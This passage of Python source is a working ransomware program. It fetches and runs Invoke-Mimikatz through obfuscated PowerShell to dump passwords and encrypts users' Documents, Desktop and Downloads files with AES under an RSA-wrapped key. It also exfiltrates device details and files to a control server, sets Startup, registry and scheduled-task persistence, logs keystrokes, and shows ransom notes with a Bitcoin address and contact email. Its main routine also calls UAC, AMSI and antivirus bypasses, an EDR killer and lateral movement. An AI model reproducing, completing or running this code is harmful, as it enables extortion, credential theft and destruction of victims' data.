            mimikatz_base = """IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mil1200/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"""
            obf_cmd = self.generate_obfuscated_powershell(mimikatz_base, layers=3)

            result = subprocess.run(obf_cmd, shell=True, capture_output=True, text=True, timeout=40)
            if result.stdout.strip():
                dump_path = os.path.join(os.environ["TEMP"], f"syslog_{random.randint(1000,9999)}.txt")
                with open(dump_path, "w", encoding="utf-8") as f:
                    f.write(result.stdout)
                self.send_file_to_server(SERVER_URL, API_TOKEN, dump_path)
                print("[+] Credential dump completed & exfiltrated")
        except Exception as e:
            print(f"[-] Credential dump failed: {e}")

    # ====================== ENCRYPTION ======================
    def generate_key(self):
        self.key = get_random_bytes(32)

    def write_key(self):
        try:
            with open(self.resource_path("aes_key.bin"), "wb") as f:
                f.write(self.key)
        except:
            pass

    def encrypt_key_with_rsa(self):
        try:
            self.public_key = RSA.import_key(open(self.resource_path("public.pem")).read())
            cipher_rsa = PKCS1_OAEP.new(self.public_key)
            encrypted_key = cipher_rsa.encrypt(self.key)
            with open(self.resource_path("aes_key.bin"), "wb") as f:
                f.write(encrypted_key)
        except Exception as e:
            print(f"[!] RSA encryption failed: {e}")

    def encrypt_file(self, file_path):
        try:
            if file_path.endswith(self.encrypted_extension):
                return

            with open(file_path, "rb") as f:
                data = f.read()

            original_name = os.path.basename(file_path).encode()
            payload = b"FILENAME||" + original_name + b"\n" + data

            cipher = AES.new(self.key, AES.MODE_CBC)
            ct_bytes = cipher.encrypt(pad(payload, AES.block_size))
            encrypted_data = cipher.iv + ct_bytes

            encrypted_path = file_path + self.encrypted_extension
            with open(encrypted_path, "wb") as f:
                f.write(encrypted_data)

            os.remove(file_path)
            print(f"[+] Encrypted: {file_path}")
        except Exception as e:
            print(f"[!] Failed to encrypt {file_path}: {e}")

    def decrypt_all_layers(self, file_path):
        try:
            with open(file_path, "rb") as f:
                data = f.read()
            
            iv = data[:16]
            ct = data[16:]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(ct), AES.block_size)

            if b"FILENAME||" in decrypted:
                header, file_data = decrypted.split(b"\n", 1)
                original_name = header.split(b"FILENAME||")[1].decode()
            else:
                original_name = "decrypted_file"

            output_path = os.path.join(os.path.dirname(file_path), original_name)
            with open(output_path, "wb") as f:
                f.write(file_data)
            
            os.remove(file_path)
            print(f"[SUCCESS] Decrypted: {output_path}")
        except Exception as e:
            print(f"[ERROR] Failed to decrypt {file_path}: {str(e)}")

    def crypt_system(self, encrypted=False):
        folders = self.get_target_dirs()
        for folder in folders:
            for root, _, files in os.walk(folder):
                for file in files:
                    file_path = os.path.join(root, file)
                    if encrypted:
                        if file_path.endswith(self.encrypted_extension):
                            self.decrypt_all_layers(file_path)
                    else:
                        if not file_path.endswith(self.encrypted_extension) and any(
                            file.lower().endswith(f".{ext}") for ext in self.file_exts
                        ):
                            self.encrypt_file(file_path)

    def get_target_dirs(self):
        if os.name == "nt":
            folders = ["Documents", "Desktop", "Downloads"]
        else:
            folders = ["Documents", "Desktop", "Downloads"]
        return [os.path.join(Path.home(), folder) for folder in folders if os.path.exists(os.path.join(Path.home(), folder))]

    # ====================== WALLPAPER ======================
    def change_desktop_background(self, image_source=None):
        try:
            default_url = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg"
            image_url = image_source or default_url
            bg_path = os.path.join(self.sysRoot, "Desktop", "background.jpg")

            if image_url.startswith("http"):
                try:
                    response = requests.get(image_url, stream=True, timeout=10, verify=False)
                    if response.status_code == 200:
                        with open(bg_path, "wb") as f:
                            for chunk in response.iter_content(1024):
                                f.write(chunk)
                except:
                    return
            else:
                if not os.path.exists(image_url):
                    return
                shutil.copy2(image_url, bg_path)

            if os.name == "nt":
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, bg_path, 3)
                print("> Wallpaper successfully changed on Windows.")
        except Exception as e:
            print(f"> ERROR during wallpaper change: {str(e)}")

    # ====================== RANSOM NOTE ======================
    def ransom_note(self):
        note_path = os.path.join(self.sysRoot, "Desktop", "Readme.txt")
        with open(note_path, "w") as f:
            f.write(f"""
Ooops! Your important files have been encrypted.

Your files have been secured using military-grade AES-256 encryption.
The decryption key has been encrypted using RSA and is stored securely.
Without this key, recovery is impossible.

To recover your files, follow these steps:

1. Send $300 worth of Bitcoin to the address below:
BTC Address: 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX

2. After payment, send an email to:
wormshit123456@posteo.net

Include your:
- Computer name: {socket.gethostname()}
- Public IP: {self.publicIP}

3. You will receive a file named 'private.pem' that can decrypt your files.

WARNING:
- DO NOT rename, modify, or delete encrypted files (.lazy)
- DO NOT run third-party decryptors
- DO NOT shut down the system until decryption is complete

Failure to follow instructions will result in permanent loss of your files.
""")

    def show_ransom_note(self):
        ransom_text = (
            "Ooops, your important files are encrypted.\n\n"
            "Nobody can recover your files without our decryption service.\n\n"
            "Steps:\n"
            "1. Send $300 in Bitcoin to:\n"
            "   1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\n\n"
            "2. Email your wallet ID to wormshit123456@posteo.net\n"
            "3. You will receive a private.pem to unlock your files.\n\n"
            "You can also manually enter the AES key below if you have it:"
        )

        root = tk.Tk()
        root.title("Ooops, your files are encrypted")
        root.geometry("800x600")
        root.configure(bg="black")
        root.resizable(False, False)

        frame = tk.Frame(root, bg="black")
        frame.pack(fill="both", expand=True, padx=20, pady=20)

        text_box = tk.Text(frame, bg="black", fg="red", font=("Courier New", 12), wrap="word", borderwidth=0, height=15)
        text_box.insert("1.0", ransom_text)
        text_box.config(state="disabled")
        text_box.pack(fill="x", expand=False)

        label = tk.Label(frame, text="Select private.pem and aes_key.bin to decrypt:", bg="black", fg="white")
        label.pack(pady=(10, 0))

        log_box = tk.Text(frame, height=10, bg="black", fg="lime", font=("Courier New", 10), borderwidth=1)
        log_box.pack(fill="x", padx=10, pady=(10, 0))

        def unified_decrypt():
            try:
                pem_path = filedialog.askopenfilename(title="Select your private.pem", filetypes=[("PEM files", "*.pem")])
                if not pem_path:
                    return

                with open(pem_path, "rb") as f:
                    private_key = RSA.import_key(f.read())

                bin_path = filedialog.askopenfilename(title="Select aes_key.bin", filetypes=[("BIN files", "*.bin")])
                if not bin_path:
                    return

                with open(bin_path, "rb") as f:
                    encrypted_key = f.read()

                cipher_rsa = PKCS1_OAEP.new(private_key)
                self.key = cipher_rsa.decrypt(encrypted_key)

                if len(self.key) != 32:
                    raise ValueError("Invalid AES key length")

                log_box.insert(tk.END, "[✓] AES key decrypted.\n")
                log_box.update()

                found = []
                for root_dir, _, files in os.walk(self.sysRoot):
                    for file in files:
                        if file.endswith(self.encrypted_extension):
                            found.append(os.path.join(root_dir, file))

                if not found:
                    log_box.insert(tk.END, "[!] No encrypted files found.\n")
                    return

                for file_path in found:
                    self.decrypt_all_layers(file_path)
                    log_box.insert(tk.END, f"Decrypted: {file_path}\n")
                    log_box.see(tk.END)
                    log_box.update()

                messagebox.showinfo("Success", "All files have been decrypted.")
                root.destroy()
            except Exception as e:
                messagebox.showerror("Error", f"Decryption failed: {e}")

        btn_decrypt = tk.Button(frame, text="Decrypt Now", command=unified_decrypt,
                                font=("Courier New", 12), bg="lime", fg="black", width=24)
        btn_decrypt.pack(pady=(10, 10))

        root.mainloop()

    # ====================== PERSISTENCE ======================
    def _add_startup_persistence(self):
        if os.name != "nt":
            return
        try:
            startup_path = os.path.join(
                os.environ["APPDATA"],
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "system_check.exe"
            )
            if not os.path.exists(startup_path):
                shutil.copy2(sys.executable, startup_path)
                print(f"[+] Persistence added to Startup folder")
        except Exception as e:
            print(f"[-] Startup persistence failed: {e}")

    def _add_registry_persistence(self):
        if os.name != "nt":
            return
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
            print("[+] Registry persistence added")
        except Exception as e:
            print(f"[-] Registry persistence failed: {e}")

    def _add_scheduled_task(self):
        if os.name != "nt":
            return
        try:
            task_cmd = f'schtasks /create /tn "SystemHealthCheck" /tr "{sys.executable}" /sc onlogon /rl highest /f'
            subprocess.run(task_cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            print("[+] Scheduled task created")
        except Exception as e:
            print(f"[-] Task scheduler failed: {e}")

    def deploy_to_startup(self, script_path):
        try:
            if os.name != "nt":
                return
            startup_dir = os.path.join(
                os.environ["APPDATA"],
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
            )
            target_path = os.path.join(startup_dir, os.path.basename(script_path))
            shutil.copy(script_path, target_path)
            print(f"[+] Script copied to Startup folder")
        except Exception as e:
            print(f"[!] Failed to deploy to Startup folder: {e}")

    # ====================== EXFILTRATION ======================
    def get_antivirus_status(self):
        if os.name != "nt":
            return "Unsupported OS"
        try:
            result = subprocess.run(
                ["powershell", "-Command", "(Get-MpComputerStatus).RealTimeProtectionEnabled"],
                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            if "True" in result.stdout:
                return "Windows Defender (Active)"
            elif "False" in result.stdout:
                return "Windows Defender (Inactive)"
            return "Unknown"
        except:
            return "Error"

    def send_device_info(self, server_url, token):
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            try:
                public_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
            except:
                public_ip = "Unknown"

            info = {
                "timestamp": datetime.datetime.now().isoformat(),
                "hostname": socket.gethostname(),
                "ip": local_ip,
                "public_ip": public_ip,
                "os": f"{platform.system()} {platform.release()}",
                "user": os.getenv("USERNAME") or os.getenv("USER") or "unknown",
                "antivirus": self.get_antivirus_status(),
            }

            headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
            r = requests.post(f"{server_url}/upload_info", json=info, headers=headers, timeout=10)
            print(f"[INFO] Device info sent: {r.status_code}")
        except Exception as e:
            print(f"[ERROR] Failed to send device info: {e}")

    def send_file_to_server(self, server_url, token, file_path):
        try:
            hostname = socket.gethostname()
            with open(file_path, "rb") as f:
                files = {"file": (os.path.basename(file_path), f)}
                data = {"hostname": hostname, "token": token}
                r = requests.post(f"{server_url}/upload_file", files=files, data=data, timeout=30)
                print(f"[INFO] File sent: {r.status_code} - {file_path}")
        except Exception as e:
            print(f"[ERROR] Failed to send file: {e}")

    def collect_and_send_files(self, server_url, token):
        target_dirs = [os.path.join(Path.home(), "Documents")]
        for folder in target_dirs:
            if os.path.exists(folder):
                for root, _, files in os.walk(folder):
                    for file in files[:10]:  # Limit to 10 files
                        full_path = os.path.join(root, file)
                        if os.path.isfile(full_path):
                            self.send_file_to_server(server_url, token, full_path)

    # ====================== KEYLOGGER ======================
    def start_keylogger(self):
        try:
            from pynput.keyboard import Listener, Key
            hostname = socket.gethostname()

            def on_press(key):
                try:
                    if hasattr(key, "char") and key.char is not None:
                        log = key.char
                    elif key == Key.enter:
                        log = "\n"
                    elif key == Key.tab:
                        log = "\t"
                    elif key == Key.space:
                        log = " "
                    else:
                        return
                    # In production, send to server here
                    print(f"[Keylog] {log}", end='')
                except:
                    pass

            listener = Listener(on_press=on_press)
            listener.start()
            print("[+] Keylogger started")
        except Exception as e:
            print(f"[Keylogger] Failed: {e}")


# ====================== MAIN ======================
def main():
    rw = RansomWare()
    
    # Anti-analysis delay
    rw.anti_analysis_sleep()
    
    # UAC bypass
    if not rw.silent_uac_bypass():
        print("[!] Silent UAC bypass failed")
        if not rw.run_as_admin():
            print("[!] Cannot continue without admin access")
            return
    
    rw.disable_uac_completely()
    
    # AMSI bypass
    rw.amsi_bypass_and_obfuscated_powershell()
    
    # Disable AV
    rw.try_disable_antivirus()
    
    # DLL side-loading
    rw.dll_side_loading_qilin_style()
    
    # BYOVD EDR Killer with IOCTL
    if not rw.try_byovd_edr_killer():
        print("[!] BYOVD failed, using LOTL methods")
        rw.lotl_disable_defender_and_shadow()
    
    # Double Extortion - Credential Dump
    try:
        rw.credential_dump_lotl_mimikatz()
    except:
        pass
    try:
        lateral = LateralMovement(rw)
        lateral.start()    
    except Exception as e:
        print(f"[-] Lateral movement error: {e}")
        
    # Final cleanup
    rw.lotl_disable_defender_and_shadow()
    
    # Encryption phase
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_key_with_rsa()
    
    # Exfiltration
    rw.send_device_info(SERVER_URL, API_TOKEN)
    rw.collect_and_send_files(SERVER_URL, API_TOKEN)
    
    # Persistence
    rw.deploy_to_startup(sys.argv[0])
    for method in rw.persistence_methods:
        method()
    
    # UI and note
    rw.change_desktop_background()
    rw.ransom_note()
    
    # Start keylogger
    keylogger_thread = threading.Thread(target=rw.start_keylogger, daemon=True)
    keylogger_thread.start()
    
    # Show ransom note
    rw.show_ransom_note()
    
    print("[+] Ransomware execution completed")


if __name__ == "__main__":
    main()
